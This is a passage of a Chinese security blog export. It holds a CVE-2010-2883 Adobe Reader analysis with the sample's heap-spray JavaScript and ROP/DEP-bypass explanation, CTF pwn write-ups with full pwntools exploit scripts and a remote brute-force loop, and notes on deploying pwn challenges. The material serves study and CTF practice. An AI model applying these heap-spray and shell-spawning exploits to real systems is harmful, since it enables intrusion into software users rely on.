<p>继续动态分析。此时即将执行retn，而esp指向的地址是0x0c0c0c0c，即</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">0C0C0C0C   4A8063A5  icucnv36.4A8063A5</span><br></pre></td></tr></table></figure>

<p>再继续动态分析之前，不妨先猜一下会发生什么，以免我们在浩瀚的汇编代码中迷失自己</p>
<p>可以从shellcode中看到我们主要指令了这么几个函数</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">&lt;&amp;KERNEL32.CreateFileA&gt;</span><br><span class="line">&lt;&amp;KERNEL32.CreateFileMappingA&gt;</span><br><span class="line">&lt;&amp;KERNEL32.MapViewOfFile&gt;</span><br><span class="line">&lt;&amp;MSVCR80.<span class="built_in">memcpy</span>&gt;</span><br></pre></td></tr></table></figure>

<p>接下来继续动态调试</p>
<p><img src="/04/cl7iordof000n293f61sk8uz8/2.png" alt></p>
<p><img src="/CVE-2010-2883-Adobe-Reader-TFF%E5%AD%97%E4%BD%93SING%E8%A1%A8%E6%A0%88%E6%BA%A2%E5%87%BA//3.png" alt></p>
<p><img src="/04/cl7iordof000n293f61sk8uz8/4.png" alt></p>
<p>上面给eax复制为CreateFile的函数指针，后面开始调用这个函数</p>
<p><img src="/04/cl7iordof000n293f61sk8uz8/5.png" alt></p>
<p>这里直接跳转到eax保存的指针所指向的地址(0x7C801A28)处</p>
<p><img src="/04/cl7iordof000n293f61sk8uz8/6.png" alt></p>
<p>单步执行到CreateFileW处，查看栈中参数</p>
<p><img src="/04/cl7iordof000n293f61sk8uz8/7.png" alt>****</p>
<p>这里都是CreateFileA的参数，来看看CreateFileA官方文档给出的结构</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function">HANDLE <span class="title">CreateFileA</span><span class="params">(</span></span></span><br><span class="line"><span class="function"><span class="params">  LPCSTR                lpFileName,</span></span></span><br><span class="line"><span class="function"><span class="params">  DWORD                 dwDesiredAccess,</span></span></span><br><span class="line"><span class="function"><span class="params">  DWORD                 dwShareMode,</span></span></span><br><span class="line"><span class="function"><span class="params">  LPSECURITY_ATTRIBUTES lpSecurityAttributes,</span></span></span><br><span class="line"><span class="function"><span class="params">  DWORD                 dwCreationDisposition,</span></span></span><br><span class="line"><span class="function"><span class="params">  DWORD                 dwFlagsAndAttributes,</span></span></span><br><span class="line"><span class="function"><span class="params">  HANDLE                hTemplateFile</span></span></span><br><span class="line"><span class="function"><span class="params">)</span></span>;</span><br></pre></td></tr></table></figure>

<p>lpFileName用于指定被创建文件的文件名。</p>
<p>dwDesiredAccess 用于指定访问权限一般都是读、写之类的。这里的GENERIC_ALL指的是采用所有可能的访问权限。</p>
<p>dwShareMode 用于指定请求的文件或设备的共享模式，这里指定的0代表了阻止其他进程在请求删除，读取或写入访问权限时打开文件或设备。</p>
<p>lpSecurityAttributes 用于设置安全描述符和子进程是否可继承，这个属性可为NULL，这里用的就是NULL。</p>
<p>dwCreationDisposition 设置对文件执行的操作。这里的CREATE_ALWAYS代表总是会创建文件，即使目标文件已存在也会覆盖它。</p>
<p>dw FlagsAndAttributes 设置文件或设备属性和标志，这里给的值是FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_TEMPORARY 代表该文件用于临时存储。</p>
<p>hTemplateFile 设置具有GENERIC_READ访问权限的模板文件的有效句柄。这个属性这里也没用到直接指定NULL。</p>
<p>总之这里创建了一个临时文件，文件名是iso88591。可以在当前样本pdf同目录下找到。</p>
<p>返回后用相同的方法构造处rop指令来调用CreateFileMappping，创建文件内存映射</p>
<p><img src="/04/cl7iordof000n293f61sk8uz8/11.png" alt></p>
<p>参数为</p>
<p><img src="/04/cl7iordof000n293f61sk8uz8/10.png" alt></p>
<p>然后执行MapViewOfFile函数</p>
<p><img src="/04/cl7iordof000n293f61sk8uz8/12.png" alt></p>
<p>再通过类似的方法调用mmap</p>
<p><img src="/04/cl7iordof000n293f61sk8uz8/13.png" alt></p>
<p>其中目的地址就是前面MapViewOfFile返回的地址，而源地址就是真正的ShellCode代码，将他复制到一段可执行可读写的内存段，以此绕过DEP保护。由于构造的ROP指令均位于不受ASLR保护的icucnv36.dll模块，因此也可绕过ASLR保护。</p>
<p>总结一下这部分由堆喷射覆盖在栈上的数据都做了一些什么。主要做了新建临时文件，将文件映射到内存，将真正的shellcode拷贝到内存的某一块区域并且解码这些shellcode然后执行。</p>
<h3 id="JavaScript实现HeapSpray"><a href="#JavaScript实现HeapSpray" class="headerlink" title="JavaScript实现HeapSpray"></a>JavaScript实现HeapSpray</h3><p>PDFStreamDumper打开恶意pdf文件，在第一个object处找到OpenAction，表示其在第11个obj中，PDF运行时会执行里面脚本</p>
<p><img src="/04/cl7iordof000n293f61sk8uz8/14.png" alt></p>
<p>进入第11个obj，表示执行的js代码位于第12个obj中</p>
<p><img src="/04/cl7iordof000n293f61sk8uz8/15.png" alt></p>
<p>进入12obj，发现实现堆喷射的js脚本</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> shellcode = <span class="built_in">unescape</span>( <span class="string">'%u4141%u4141%u63a5%u4a80%u0000%u4a8a%u2196%u4a80%u1f90%u4a80%u903c%u4a84%ub692%u4a80%u1064%u4a80%······30%u1602%u50d3'</span> );</span><br><span class="line"><span class="keyword">var</span> block = <span class="built_in">unescape</span>( <span class="string">"%"</span> + <span class="string">"u"</span> + <span class="string">"0"</span> + <span class="string">"c"</span> + <span class="string">"0"</span> + <span class="string">"c"</span> + <span class="string">"%u"</span> + <span class="string">"0"</span> + <span class="string">"c"</span> + <span class="string">"0"</span> + <span class="string">"c"</span> );</span><br><span class="line"><span class="keyword">while</span> (block.length + <span class="number">20</span> + <span class="number">8</span> &lt; <span class="number">65536</span>) </span><br><span class="line">    block+=block;</span><br><span class="line">SP = block.substring(<span class="number">0</span>, (<span class="number">0x0c0c</span><span class="number">-0x24</span>)/<span class="number">2</span>);</span><br><span class="line">SP += shellcode;</span><br><span class="line">SP += block;</span><br><span class="line">slackspace = SP.substring(<span class="number">0</span>, <span class="number">65536</span>/<span class="number">2</span>);</span><br><span class="line"><span class="keyword">while</span>(slackspace.length &lt; <span class="number">0x80000</span>) </span><br><span class="line">    slackspace += slackspace;</span><br><span class="line">bigblock = slackspace.substring(<span class="number">0</span>, <span class="number">0x80000</span> - (<span class="number">0x1020</span><span class="number">-0x08</span>) / <span class="number">2</span>);</span><br><span class="line"><span class="keyword">var</span> memory = <span class="keyword">new</span> <span class="built_in">Array</span>();</span><br><span class="line"><span class="keyword">for</span> (count=<span class="number">0</span>;count&lt;<span class="number">0x1f0</span>;count++) memory[cout]=bigblock+<span class="string">"s"</span>;</span><br></pre></td></tr></table></figure>

<p>所有的shellcode都被转化成了十六进制的转义序列，经过unescape解码之后存储在了var_shellcode之中。var_c变量存储了“%u0c0c%u0c0c”，接下来用了一个while循环叠加block，用于覆盖内存中的数据，采用0x0c0c0c0c的原因是因为它所对应的指令是</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">or al,0x0C</span><br></pre></td></tr></table></figure>

<p>这样的指令执行的效果对al寄存器不会产生任何影响很适合当作滑板指令是堆喷射的常用技巧。</p>
<p>接下来的SP保存了前面的所有滑板指令以及shellcode。最关键的实现堆喷射的语句是new Array()</p>
<p>利用数组来开辟内存区域，然后通过填充数组数据的方式来喷射shellcode。</p>
<h2 id="PDF格式-amp-样本构造"><a href="#PDF格式-amp-样本构造" class="headerlink" title="PDF格式&amp;样本构造"></a>PDF格式&amp;样本构造</h2><p>先回顾一下漏洞的触发点，漏洞的触发点是在解析TTF字体的SING表时出现的问题。那很显然我们首先要了解一下TTF的格式定义以及SING表的具体字段。同时我们还需要了解PDF格式规范当中是如何来引用TTF字体文件的，以及PDF是怎么支持JavaScript脚本执行的。</p>
<p>先来了解一下PDF的基本格式</p>
<p><img src="/04/cl7iordof000n293f61sk8uz8/16.png" alt></p>
<p>首先看到的是Header部分。这是PDF文件的开始部分。主要用来指明当前PDF文件所遵循的PDF格式标准版本。例如%PDF-1.5</p>
<p>Body部分包含了PDF文档的主要内容，所有向用户展现的内容都在此存放。</p>
<p>Cross-reference table 即交叉引用表，包含了当前PDF文档中所有对象的引用、偏移量以及字节长度。借助这个引用表可以在全文档范围内随机访问任何一个对象，非常的方便。</p>
<p>Trailer主要包含了指向交叉引用表的指针以及一些关键对象的指针并且以%%EOF标记文件结束，帮助符合标准的阅读器能够快速定位到需要的对象。所有的PDF阅读器都是要从这里开始解析。</p>
<p>了解完PDF基本格式。秉承着用到什么再提什么的原则，我们这里通过分析MSF提供的exp来帮助理解PDF文档的构造过程。</p>
<p>定位到 def make_pdf(ttf, js) 的部分，这里是创建pdf的核心位置。</p>
<p>来到/opt/metasploit-framework/embedded/framework/modules/exploits/windows/fileformat/adobe_cooltype_sing.rb</p>
<p>这个脚本是用ruby语言编写的，对于ruby语法的相关细节本文不再赘述。</p>
<p>定位到 def make_pdf(ttf, js) 的部分，这里是创建pdf的核心位置。</p>
<figure class="highlight ruby"><table><tr><td class="code"><pre><span class="line">xref = []</span><br><span class="line">eol = <span class="string">"n"</span></span><br><span class="line">endobj = <span class="string">"endobj"</span> &lt;&lt; eol</span><br></pre></td></tr></table></figure>

<p>看到首先定义了几个接下来会用到的字符以及交叉引用表xref。</p>
<figure class="highlight ruby"><table><tr><td class="code"><pre><span class="line">pdf = <span class="string">"%PDF-1.5"</span> &lt;&lt; eol</span><br><span class="line">pdf &lt;&lt; <span class="string">"%"</span> &lt;&lt; random_non_ascii_string(<span class="number">4</span>) &lt;&lt; eol</span><br></pre></td></tr></table></figure>

<p>这里描述的是Header部分的内容，首先定义了版本号，这个样本遵循的是PDF1.5版本。</p>
<p>接下来调用了一个random_non_ascii_string函数</p>
<figure class="highlight ruby"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">random_non_ascii_string</span><span class="params">(count)</span></span></span><br><span class="line">  result = <span class="string">""</span></span><br><span class="line">  count.times <span class="keyword">do</span></span><br><span class="line">    result &lt;&lt; (rand(<span class="number">128</span>) + <span class="number">128</span>).chr</span><br><span class="line">  <span class="keyword">end</span></span><br><span class="line">  result</span><br><span class="line"><span class="keyword">end</span></span><br></pre></td></tr></table></figure>

<p>该函数用于随机出不再ASCII范围内的字符。换句话说这里随机了4个字符。关于这四个字符的作用。Adobe给出的PDF文档里是这样描述的</p>
<blockquote>
<p>If a PDF file contains binary data, as most <strong>do</strong>, the header line shall be immediately followed <strong>by</strong> a <strong>comment</strong> line containing <strong>at</strong> <strong>least</strong> four binary <strong>characters</strong>—that <strong>is</strong> ,<strong>characters</strong> whose codes <strong>are</strong> 128 <strong>or</strong> greater. This ensures proper behaviour <strong>of</strong> <strong>file</strong> transfer applications that inspect <strong>data</strong> near the <strong>beginning</strong> <strong>of</strong> a <strong>file</strong> <strong>to</strong> determine whether <strong>to</strong> <strong>treat</strong> the <strong>file</strong>‘s contents as text or as binary.</p>
</blockquote>
<p>这四个code大于128的字符用于确保当前PDF文档被当作二进制文件来对待而不是文本文件。</p>
<p>看完了Header部分的实现，再看Body部分的实现之前，先来了解一下Body部分大致的组织结构。</p>
<p><img src="/04/cl7iordof000n293f61sk8uz8/17.png" alt></p>
<p>继续往下看会看到catalog对象的定义</p>
<figure class="highlight ruby"><table><tr><td class="code"><pre><span class="line">xref &lt;&lt; pdf.length</span><br><span class="line">pdf &lt;&lt; io_def(<span class="number">1</span>) &lt;&lt; n_obfu(<span class="string">"&lt;&lt;"</span>) &lt;&lt; eol</span><br><span class="line">pdf &lt;&lt; n_obfu(<span class="string">"/Pages "</span>) &lt;&lt; io_ref(<span class="number">2</span>) &lt;&lt; eol</span><br><span class="line">pdf &lt;&lt; n_obfu(<span class="string">"/Type /Catalog"</span>) &lt;&lt; eol</span><br><span class="line">pdf &lt;&lt; n_obfu(<span class="string">"/OpenAction "</span>) &lt;&lt; io_ref(<span class="number">11</span>) &lt;&lt; eol</span><br><span class="line"><span class="comment"># The AcroForm is required to get icucnv36.dll to load</span></span><br><span class="line">pdf &lt;&lt; n_obfu(<span class="string">"/AcroForm "</span>) &lt;&lt; io_ref(<span class="number">13</span>) &lt;&lt; eol</span><br><span class="line">pdf &lt;&lt; n_obfu(<span class="string">"&gt;&gt;"</span>) &lt;&lt; eol</span><br><span class="line">pdf &lt;&lt; endobj</span><br></pre></td></tr></table></figure>

<p>这里用到了两个io_def和n_obfu函数。此处的xref &lt;&lt; pdf.length用于记录对象的偏移量。</p>
<figure class="highlight ruby"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">io_def</span><span class="params">(id)</span></span> </span><br><span class="line">    <span class="string">"%d 0 obj n"</span> % id</span><br><span class="line"><span class="keyword">end</span></span><br></pre></td></tr></table></figure>

<h3 id="漏洞修复"><a href="#漏洞修复" class="headerlink" title="漏洞修复"></a>漏洞修复</h3><p>下载AdobeReader 9.4.0版本提取CoolType.dll，定位到相同的位置</p>
<p>很显然这里不再是调用strcat而是改为调用sub_813391E函数</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">.text:0813391E                 push    esi</span><br><span class="line">.text:0813391F                 mov     esi, [esp+4+arg_0]</span><br><span class="line">.text:08133923                 push    esi             ; char *</span><br><span class="line">.text:08133924                 call    strlen</span><br><span class="line">.text:08133929                 pop     ecx</span><br><span class="line">.text:0813392A                 mov     ecx, [esp+4+arg_8]</span><br><span class="line">.text:0813392E                 cmp     ecx, eax</span><br><span class="line">.text:08133930                 ja      short loc_8133936</span><br><span class="line">.text:08133932                 mov     eax, esi</span><br><span class="line">.text:08133934                 pop     esi</span><br><span class="line">.text:08133935                 retn</span><br><span class="line">.text:08133936 loc_8133936:                            ; CODE XREF: sub_813391E+12↑j</span><br><span class="line">.text:08133936                 sub     ecx, eax</span><br><span class="line">.text:08133938                 dec     ecx</span><br><span class="line">.text:08133939                 push    ecx             ; size_t</span><br><span class="line">.text:0813393A                 push    [esp+8+arg_4]   ; char *</span><br><span class="line">.text:0813393E                 add     eax, esi</span><br><span class="line">.text:08133940                 push    eax             ; char *</span><br><span class="line">.text:08133941                 call    ds:strncat</span><br><span class="line">.text:08133947                 add     esp, 0Ch</span><br><span class="line">.text:0813394A                 pop     esi</span><br><span class="line">.text:0813394B                 retn</span><br></pre></td></tr></table></figure>

<p>该函数获取了字段的长度，判断是否超出限制。如果超出限制就用strncat限制了拷贝的字节数从而修复了该漏洞。</p>
<h2 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h2><p><a href="https://www.anquanke.com/post/id/179681#h2-1" target="_blank" rel="noopener">https://www.anquanke.com/post/id/179681#h2-1</a></p>
<p>漏洞战争p15</p>
]]></content>
      <categories>
        <category>CVE</category>
      </categories>
      <tags>
        <tag>CVE</tag>
      </tags>
  </entry>
  <entry>
    <title>Rctf writeup</title>
    <url>/year/06/04/cl7iordoy0011293fxrk5kmox/</url>
    <content><![CDATA[<p>没去打比赛，留着慢慢复现~</p>
<a id="more"></a>

<h2 id="0x1-note"><a href="#0x1-note" class="headerlink" title="0x1 note"></a>0x1 note</h2><p>现在刷来刷去，觉得堆体最大的作用就是让自己调试越来越熟练，看ida越来越熟练，没学到什么新的知识，后面要多刷能让自己学到东西的题目，多复现CVE了。</p>
<h3 id="1-1-漏洞分析"><a href="#1-1-漏洞分析" class="headerlink" title="1.1 漏洞分析"></a>1.1 漏洞分析</h3><ol>
<li>所有的下标判断没有判断负数</li>
<li>有一个函数里存在堆溢出</li>
</ol>
<h3 id="1-2-利用技巧"><a href="#1-2-利用技巧" class="headerlink" title="1.2 利用技巧"></a>1.2 利用技巧</h3><ol>
<li>calloc不会使用tcache</li>
<li>tcache链不会判断chunk的size</li>
</ol>
<h3 id="1-3-利用思路"><a href="#1-3-利用思路" class="headerlink" title="1.3 利用思路"></a>1.3 利用思路</h3><ol>
<li>用show泄露libc</li>
<li>用add和sell布置好tcache链</li>
<li>用溢出函数覆盖fd</li>
<li>三次malloc拿shell</li>
</ol>
<h3 id="1-4-exp"><a href="#1-4-exp" class="headerlink" title="1.4 exp"></a>1.4 exp</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">sh = process(<span class="string">'./note'</span>)</span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line">context.terminal = [<span class="string">'tmux'</span>, <span class="string">'splitw'</span>, <span class="string">'-h'</span>]</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span><span class="params">(idx, size)</span>:</span></span><br><span class="line">    sh.recvuntil(<span class="string">": "</span>)</span><br><span class="line">    sh.sendline(<span class="string">'1'</span>)</span><br><span class="line">    sh.recvuntil(<span class="string">'Index: '</span>)</span><br><span class="line">    sh.sendline(str(idx))</span><br><span class="line">    sh.recvuntil(<span class="string">": "</span>)</span><br><span class="line">    sh.sendline(str(size))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">sell</span><span class="params">(idx)</span>:</span></span><br><span class="line">    sh.recvuntil(<span class="string">": "</span>)</span><br><span class="line">    sh.sendline(<span class="string">'2'</span>)</span><br><span class="line">    sh.recvuntil(<span class="string">": "</span>)</span><br><span class="line">    sh.sendline(str(idx))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span><span class="params">(idx, content)</span>:</span></span><br><span class="line">    sh.recvuntil(<span class="string">": "</span>)</span><br><span class="line">    sh.sendline(<span class="string">'4'</span>)</span><br><span class="line">    sh.recvuntil(<span class="string">": "</span>)</span><br><span class="line">    sh.sendline(str(idx))</span><br><span class="line">    sh.recvuntil(<span class="string">': \n'</span>)</span><br><span class="line">    sh.send(content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span><span class="params">(idx)</span>:</span></span><br><span class="line">    sh.recvuntil(<span class="string">": "</span>)</span><br><span class="line">    sh.sendline(<span class="string">'3'</span>)</span><br><span class="line">    sh.recvuntil(<span class="string">': '</span>)</span><br><span class="line">    sh.sendline(str(idx))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">once</span><span class="params">(idx,content)</span>:</span></span><br><span class="line">    sh.recvuntil(<span class="string">": "</span>)</span><br><span class="line">    sh.sendline(<span class="string">'7'</span>)</span><br><span class="line">    sh.recvuntil(<span class="string">": "</span>)</span><br><span class="line">    sh.sendline(str(idx))</span><br><span class="line">    sh.recvuntil(<span class="string">': \n'</span>)</span><br><span class="line">    sh.send(content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">New</span><span class="params">(content)</span>:</span></span><br><span class="line">    sh.recvuntil(<span class="string">": "</span>)</span><br><span class="line">    sh.sendline(<span class="string">'6'</span>)</span><br><span class="line">    sh.recvuntil(<span class="string">': \n'</span>)</span><br><span class="line">    sh.send(content)</span><br><span class="line"></span><br><span class="line"><span class="comment">#gdb.attach(sh)</span></span><br><span class="line">show(<span class="number">-5</span>)</span><br><span class="line">data_addr = u64(sh.recv(<span class="number">8</span>))</span><br><span class="line">sh.recv(<span class="number">16</span>)</span><br><span class="line">libcbase = u64(sh.recv(<span class="number">8</span>)) - <span class="number">0x1e5760</span></span><br><span class="line">one_gadget = libcbase + <span class="number">0xe237f</span></span><br><span class="line">log.success(<span class="string">'data_addr: '</span> + hex(data_addr))</span><br><span class="line">log.success(<span class="string">'libc_base: '</span> + hex(libcbase))</span><br><span class="line"></span><br><span class="line"><span class="comment">#set money</span></span><br><span class="line">payload = p64(data_addr) + p32(<span class="number">0xffffff</span>)</span><br><span class="line">edit(<span class="number">-5</span>,payload+<span class="string">'\n'</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#ready chunk</span></span><br><span class="line">add(<span class="number">0</span>,<span class="number">0x50</span>)</span><br><span class="line">add(<span class="number">1</span>,<span class="number">0x50</span>)</span><br><span class="line">sell(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#tcache poision</span></span><br><span class="line">malloc_hook = libcbase + <span class="number">0x1e4c30</span></span><br><span class="line">content = <span class="string">''</span></span><br><span class="line">content += <span class="string">'a'</span>*<span class="number">0x50</span></span><br><span class="line">content += p64(<span class="number">0</span>) + p64(<span class="number">0x61</span>)</span><br><span class="line">content += p64(malloc_hook)</span><br><span class="line">once(<span class="number">0</span>,content+<span class="string">'\n'</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#malloc twice</span></span><br><span class="line">New(<span class="string">"a"</span>+<span class="string">'\n'</span>)</span><br><span class="line">sell(<span class="number">-2</span>)</span><br><span class="line">New(p64(one_gadget)+<span class="string">'\n'</span>)</span><br><span class="line">sell(<span class="number">-2</span>)</span><br><span class="line">sh.recvuntil(<span class="string">': '</span>)</span><br><span class="line">sh.sendline(<span class="string">'6'</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#gdb.attach(sh)</span></span><br><span class="line"></span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>pwn题writeup</category>
      </categories>
      <tags>
        <tag>writeup</tag>
      </tags>
  </entry>
  <entry>
    <title>pwn题部署</title>
    <url>/year/06/01/cl7iordpz003s293f8yyen5a9/</url>
    <content><![CDATA[<p>ctfd上的pwn题部署，服务器系统centos</p>
<a id="more"></a>

<h2 id="docker-docker-compose安装"><a href="#docker-docker-compose安装" class="headerlink" title="docker, docker-compose安装"></a>docker, docker-compose安装</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">yum update</span><br><span class="line">yum install -y yum-utils device-mapper-persistent-data lvm2</span><br><span class="line">yum-config-manager --add-repo https://download.docker.com/linux/centos/docker-ce.repo</span><br><span class="line">yum install -y docker-ce</span><br><span class="line">systemctl start docker</span><br><span class="line">systemctl enable docker</span><br><span class="line">yum -y install epel-release</span><br><span class="line">yum -y install python-pip</span><br><span class="line">pip install -i https://pypi.tuna.tsinghua.edu.cn/simple docker-compose</span><br></pre></td></tr></table></figure>

<h2 id="Pwn题部署"><a href="#Pwn题部署" class="headerlink" title="Pwn题部署"></a>Pwn题部署</h2><p>基于<code>xinted + docker</code></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">git clone https://github.com/Eadom/ctf_xinetd.git</span><br><span class="line">rm ctf_xinetd/bin/helloworld</span><br><span class="line">cp pwn ctf_xinetd/bin/pwn</span><br><span class="line">echo &lt;newflag&gt; &gt; ctf_xinetd/bin/flag</span><br><span class="line">vim ctf_xinetd/ctf.xinetd</span><br></pre></td></tr></table></figure>

<p><code>ctf.xinetd</code>中主要修改<code>server_args = --userspec=1000:1000 /home/ctf ./helloworld</code>中的<code>helloworld</code>为二进制文件名称(<code>pwn</code>).</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">cd ctf_xinetd</span><br><span class="line">sudo docker build -t &quot;mypwn&quot; .</span><br><span class="line">sudo docker run -d -p &quot;0.0.0.0:8001:9999&quot; -h &quot;mypwn&quot; --name=&quot;mypwn&quot; mypwn</span><br></pre></td></tr></table></figure>

<p><code>pwn</code>题要先关闭缓冲区.</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">setvbuf(<span class="built_in">stdin</span>, <span class="number">0L</span>L, <span class="number">2</span>, <span class="number">0L</span>L);</span><br><span class="line">setvbuf(<span class="built_in">stdout</span>, <span class="number">0L</span>L, <span class="number">2</span>, <span class="number">0L</span>L);</span><br><span class="line">setvbuf(<span class="built_in">stderr</span>, <span class="number">0L</span>L, <span class="number">2</span>, <span class="number">0L</span>L);</span><br></pre></td></tr></table></figure>

<p>完成后可以<code>nc 127.0.0.1 端口号</code>来查看是否成功</p>
<p>阿里云等服务器需要把设置的端口添加到安全组里否则远程可能无法连接上</p>
]]></content>
      <categories>
        <category>环境</category>
      </categories>
      <tags>
        <tag>tools</tag>
      </tags>
  </entry>
  <entry>
    <title>网鼎杯writeup</title>
    <url>/year/05/12/cl7iordqo005r293fas9exf6h/</url>
    <content><![CDATA[<h2 id="0x0-前言"><a href="#0x0-前言" class="headerlink" title="0x0 前言"></a>0x0 前言</h2><p>这次的pwn基本上都是vm pwn，虚拟指令集，这类题代码量大，需要逆向时间长。但做这类题的关键点在于找到虚拟机中和真实环境的交互点，找到可以泄露真实地址的方式之后这种题基本就稳了。</p>
<a id="more"></a>

<h2 id="0x1-boom1"><a href="#0x1-boom1" class="headerlink" title="0x1 boom1"></a>0x1 boom1</h2><h3 id="1-1-题目分析与解题思路"><a href="#1-1-题目分析与解题思路" class="headerlink" title="1.1 题目分析与解题思路"></a>1.1 题目分析与解题思路</h3><p>这道题就是一个语言解析器，也就是你输入什么代码就执行什么，但是函数只能用一次。</p>
<p>而这道题逃逸的突破口在于它可以用程序里的变量来泄露它真机中的真实地址。</p>
<p>解题思路是用它自身的变量来获取libc，然后打exit_hook即可。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">r = process(<span class="string">'./boom1'</span>)</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">'DEBUG'</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#gdb.attach(r)</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">'''</span></span><br><span class="line"><span class="string">int buf ;</span></span><br><span class="line"><span class="string">int main() &#123;</span></span><br><span class="line"><span class="string">    int a;</span></span><br><span class="line"><span class="string">    int ptr;</span></span><br><span class="line"><span class="string">    int libc_base;</span></span><br><span class="line"><span class="string">    ptr = &amp;buf;</span></span><br><span class="line"><span class="string">    libc_base = ptr - 0x503010;</span></span><br><span class="line"><span class="string">    ptr = libc_base + 0x5f0f48;</span></span><br><span class="line"><span class="string">    </span></span><br><span class="line"><span class="string">    read(0,ptr,3);</span></span><br><span class="line"><span class="string">    return 0;</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"></span><br><span class="line">r.recvline()</span><br><span class="line">r.sendline(payload)</span><br><span class="line">r.recv(timeout=<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">r.recv(timeout=<span class="number">1</span>)</span><br><span class="line"><span class="comment">#gdb.attach(r)</span></span><br><span class="line">r.send(<span class="string">'\x47\xe1\xAf'</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># libc = int(r.recvline(),16)</span></span><br><span class="line"><span class="comment"># print "libc: " + hex(libc)</span></span><br><span class="line"></span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>

<h3 id="1-2-libc位置情况下的偏移爆破"><a href="#1-2-libc位置情况下的偏移爆破" class="headerlink" title="1.2 libc位置情况下的偏移爆破"></a>1.2 libc位置情况下的偏移爆破</h3><p>由于libc版本未知，远程偏移未知，所以需要爆破偏移,从-99到99爆破，从网上找到了别人爆破的脚本，学到了新的知识。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</span><br><span class="line">    <span class="keyword">for</span> x <span class="keyword">in</span> range(<span class="number">-99</span>, <span class="number">99</span>):</span><br><span class="line">        ············</span><br><span class="line">        libc.address = leaked - <span class="number">0x612500</span> - <span class="number">0x1000</span> * x</span><br><span class="line">        success(<span class="string">"libc -&gt; &#123;:#x&#125;"</span>.format(libc.address))</span><br><span class="line">        ···········</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            io.recv()</span><br><span class="line">            io.sendline(<span class="string">"ls"</span>)</span><br><span class="line">            <span class="keyword">if</span> <span class="string">"flag"</span> <span class="keyword">in</span> io.recv():</span><br><span class="line">                io.interactive()</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                io.close()</span><br><span class="line">                io = remote(<span class="string">"node3.buuoj.cn"</span>, <span class="number">27119</span>)</span><br><span class="line">                <span class="comment"># io = process("./hardcore_fmt")</span></span><br><span class="line">        <span class="keyword">except</span> Exception:</span><br><span class="line">            io.close()</span><br><span class="line">            <span class="comment"># io = process("./hardcore_fmt")</span></span><br><span class="line">            io = remote(<span class="string">"node3.buuoj.cn"</span>, <span class="number">27119</span>)</span><br></pre></td></tr></table></figure>

<h2 id="0x2-boom2"><a href="#0x2-boom2" class="headerlink" title="0x2 boom2"></a>0x2 boom2</h2><h3 id="2-1-分析题目"><a href="#2-1-分析题目" class="headerlink" title="2.1 分析题目"></a>2.1 分析题目</h3><p>首先用malloc分配了两块内存，分析后得出一块是栈，代码段，分析前面这块的行为，它把真实的栈地址push到了虚拟的栈中，这里是突破的一个关键点，提供了我们突破虚拟机的限制来与虚拟内存之外进行交互。</p>
<p><img src="/12/cl7iordqo005r293fas9exf6h/1.png" alt></p>
<p>然后看下图，我们输入的内容是进入到buf中的，也就是代码段，然后程序对我们的输入进行取址，译码。</p>
<p>再下一步就是根据取到的指令进行执行</p>
<p><img src="/12/cl7iordqo005r293fas9exf6h/2.png" alt></p>
<p>经过分析以后可知,各操作数对应的指令为(带imm的指令就是有一个原操作数是立即数)</p>
